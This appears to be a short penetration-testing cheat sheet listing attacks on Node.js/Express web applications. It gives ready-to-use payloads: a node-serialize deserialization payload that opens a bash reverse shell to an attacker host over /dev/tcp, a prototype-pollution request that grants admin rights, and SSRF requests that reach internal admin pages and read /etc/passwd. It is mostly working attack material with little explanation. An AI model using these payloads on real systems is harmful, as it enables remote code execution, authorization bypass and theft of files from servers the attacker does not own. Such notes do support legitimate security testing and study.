# Node.js / Express

### Detect Node.js

Headers and error pages reveal the framework

```bash
curl -sI http://$IP/ | grep -i "x-powered-by"
# "X-Powered-By: Express" = Node.js/Express
```

---

### Node.js deserialization RCE

Unsafe unserialize() — RCE via crafted cookie or input

```bash
# If the app uses node-serialize, craft IIFE payload:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/$LHOST/4444 0>&1')}()"}
# Base64 encode and inject into vulnerable cookie/parameter
```

---

### Prototype pollution

Modify Object.prototype — Can lead to RCE or auth bypass

```bash
curl -X POST http://$IP/api -H "Content-Type: application/json" -d '{"__proto__":{"admin":true}}'
```

---

### SSRF in Node.js

Server-side request forgery — Access internal services

```bash
curl "http://$IP/fetch?url=http://127.0.0.1:3000/admin"
curl "http://$IP/fetch?url=file:///etc/passwd"
```

---
